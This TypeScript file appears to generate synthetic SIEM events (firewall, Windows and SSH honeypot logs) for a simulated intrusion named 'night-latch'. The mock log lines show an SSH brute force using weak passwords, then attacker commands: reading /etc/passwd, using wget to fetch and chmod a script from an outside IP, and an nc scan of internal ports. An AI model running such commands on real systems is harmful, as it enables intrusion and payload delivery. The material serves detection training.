import type { Severity, SiemEvent, SourceKind } from "./types";
import { ATTACKS } from "./attacks";
import { HASHES } from "./intel";

const WORKSTATIONS = [
  { host: "FIN-WS-14", user: "MERIDIAN\\j.chen", ip: "10.10.20.44" },
  { host: "HR-LAP-07", user: "MERIDIAN\\r.okonkwo", ip: "10.10.30.19" },
  { host: "DEV-WS-03", user: "MERIDIAN\\a.rossi", ip: "10.10.40.8" },
  { host: "CORP-WS-21", user: "MERIDIAN\\m.patel", ip: "10.10.20.61" },
  { host: "CORP-WS-08", user: "MERIDIAN\\l.nguyen", ip: "10.10.20.18" },
  { host: "FIN-WS-02", user: "MERIDIAN\\s.okada", ip: "10.10.20.32" },
];

const EXT = [
  "8.8.8.8",
  "1.1.1.1",
  "13.107.42.14",
  "52.84.12.10",
  "142.250.185.14",
  "20.42.64.25",
  "104.16.132.229",
  "3.233.158.15",
];

function mulberry32(seed: number) {
  return () => {
    let t = (seed += 0x6d2b79f5);
    t = Math.imul(t ^ (t >>> 15), t | 1);
    t ^= t + Math.imul(t ^ (t >>> 7), t | 61);
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}

function iso(day: number, h: number, m: number, s: number, ms = 0) {
  return new Date(Date.UTC(2026, 9, day, h, m, s, ms)).toISOString();
}

let seq = 0;
function id() {
  seq += 1;
  return `evt-${String(seq).padStart(4, "0")}`;
}

function ev(partial: Omit<SiemEvent, "id">): SiemEvent {
  return { id: id(), ...partial };
}

function panTraffic(opts: {
  ts: string;
  src: string;
  dst: string;
  dport: number;
  sport?: number;
  action: string;
  app: string;
  rule: string;
  bytes: number;
  severity?: Severity;
  incidentId?: string;
  notable?: boolean;
  mitre?: string[];
  extra?: string;
}): SiemEvent {
  const sport = opts.sport ?? 40000 + Math.floor((opts.dport * 17) % 20000);
  const type = opts.action === "deny" || opts.action === "drop" ? "THREAT" : "TRAFFIC";
  return ev({
    ts: opts.ts,
    source: "firewall",
    sourcetype: type === "THREAT" ? "pan:threat" : "pan:traffic",
    index: "network",
    host: "FW-EDGE-01",
    severity: opts.severity ?? (opts.action === "deny" ? "low" : "info"),
    action: opts.action,
    srcIp: opts.src,
    destIp: opts.dst,
    destPort: opts.dport,
    srcPort: sport,
    app: opts.app,
    bytesOut: opts.bytes,
    incidentId: opts.incidentId,
    notable: opts.notable,
    mitre: opts.mitre,
    raw: `${opts.ts} FW-EDGE-01 ${type} src=${opts.src} dst=${opts.dst} sport=${sport} dport=${opts.dport} app=${opts.app} action=${opts.action} bytes=${opts.bytes} rule=${opts.rule} device=PA-3220${opts.extra ? ` ${opts.extra}` : ""}`,
  });
}

function cowrie(opts: {
  ts: string;
  src: string;
  msg: string;
  severity: Severity;
  user?: string;
  action?: string;
  notable?: boolean;
  mitre?: string[];
  destPort?: number;
}): SiemEvent {
  return ev({
    ts: opts.ts,
    source: "honeypot",
    sourcetype: "cowrie",
    index: "honeypot",
    host: "HPOT-SSH-01",
    severity: opts.severity,
    user: opts.user,
    srcIp: opts.src,
    destIp: "10.50.1.20",
    destPort: opts.destPort ?? 22,
    action: opts.action,
    notable: opts.notable,
    mitre: opts.mitre,
    incidentId: "night-latch",
    raw: `${opts.ts.replace("T", " ").replace(".000Z", "")} HPOT-SSH-01 cowrie: ${opts.msg}`,
  });
}

function win(opts: {
  ts: string;
  host: string;
  eventCode: string;
  raw: string;
  severity: Severity;
  user?: string;
  srcIp?: string;
  destIp?: string;
  process?: string;
  action?: string;
  incidentId?: string;
  notable?: boolean;
  mitre?: string[];
}): SiemEvent {
  return ev({
    ts: opts.ts,
    source: "system",
    sourcetype: opts.eventCode.startsWith("1") && opts.eventCode.length <= 2 ? "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" : "WinEventLog:Security",
    index: "winevent",
    host: opts.host,
    eventCode: opts.eventCode,
    severity: opts.severity,
    user: opts.user,
    srcIp: opts.srcIp,
    destIp: opts.destIp,
    process: opts.process,
    action: opts.action,
    incidentId: opts.incidentId,
    notable: opts.notable,
    mitre: opts.mitre,
    raw: opts.raw,
  });
}

function nightLatch(): SiemEvent[] {
  const out: SiemEvent[] = [];
  const users = ["root", "admin", "ubuntu", "pi", "oracle", "test", "postgres", "merlin"];
  const passwords = ["123456", "password", "admin", "toor", "changeme", "letmein", "qwerty", "Summer2024!"];

  out.push(
    panTraffic({
      ts: iso(1, 1, 12, 4),
      src: "185.220.101.47",
      dst: "10.50.1.20",
      dport: 22,
      action: "allow",
      app: "ssh",
      rule: "DMZ-HONEYPOT-IN",
      bytes: 480,
      severity: "low",
      incidentId: "night-latch",
      extra: "session=start threatid=brute-force-suspect",
    }),
  );

  let attempt = 0;
  for (let min = 12; min <= 36; min += 3) {
    for (let burst = 0; burst < 3; burst++) {
      const user = users[(min + burst) % users.length];
      const pass = passwords[(min + burst) % (passwords.length - 1)];
      attempt += 140 + ((min * 3 + burst) % 90);
      out.push(
        cowrie({
          ts: iso(1, 1, min, 8 + burst * 11),
          src: burst === 2 ? "185.220.102.8" : "185.220.101.47",
          user,
          action: "failed",
          severity: "low",
          mitre: ["T1110.001"],
          msg: `[SSH] login attempt [${user}/${pass}] failed from ${burst === 2 ? "185.220.102.8" : "185.220.101.47"}:${44122 + burst} (campaign_failures=${attempt})`,
        }),
      );
    }
  }

  out.push(
    cowrie({
      ts: iso(1, 2, 37, 11),
      src: "185.220.101.47",
      user: "admin",
      action: "success",
      severity: "high",
      notable: true,
      mitre: ["T1110.001", "T1078"],
      msg: "[SSH] login attempt [admin/Summer2024!] succeeded from 185.220.101.47:44190 session=c0wrie-9f2a",
    }),
    cowrie({
      ts: iso(1, 2, 37, 44),
      src: "185.220.101.47",
      user: "admin",
      action: "command",
      severity: "medium",
      mitre: ["T1059.004"],
      msg: "[SSH] CMD: uname -a ; id ; cat /etc/passwd (session=c0wrie-9f2a)",
    }),
    cowrie({
      ts: iso(1, 2, 38, 19),
      src: "185.220.101.47",
      user: "admin",
      action: "command",
      severity: "high",
      mitre: ["T1105", "T1059.004"],
      msg: "[SSH] CMD: wget -q http://91.215.85.22/ld.sh -O /tmp/.x ; chmod +x /tmp/.x (session=c0wrie-9f2a)",
    }),
    cowrie({
      ts: iso(1, 2, 39, 2),
      src: "185.220.101.47",
      user: "admin",
      action: "command",
      severity: "high",
      notable: true,
      mitre: ["T1046"],
      msg: "[SSH] CMD: for h in 10.10.1.{1..20}; do nc -z -w1 $h 445 22 3389; done (session=c0wrie-9f2a)",
    }),
    panTraffic({
      ts: iso(1, 2, 39, 6),
      src: "10.50.1.20",
      dst: "10.10.1.10",
      dport: 445,
      action: "deny",
      app: "ms-ds-smb",
      rule: "DENY-DMZ-TO-SERVERS",
      bytes: 64,
      severity: "high",
      incidentId: "night-latch",
      notable: true,
      mitre: ["T1046", "T1021.002"],
      extra: "reason=policy threatid=lateral-probe",
    }),
    panTraffic({
      ts: iso(1, 2, 39, 7),
      src: "10.50.1.20",
      dst: "10.10.1.10",
      dport: 3389,
      action: "deny",
      app: "ms-rdp",
      rule: "DENY-DMZ-TO-SERVERS",
      bytes: 48,
      severity: "medium",
      incidentId: "night-latch",
      mitre: ["T1046"],
    }),
    cowrie({
      ts: iso(1, 2, 41, 18),
      src: "185.220.101.47",
      user: "admin",
      action: "disconnect",
      severity: "medium",
      msg: "[SSH] Connection lost after 247s session=c0wrie-9f2a commands=11 downloads=1",
    }),
  );
  return out;
}
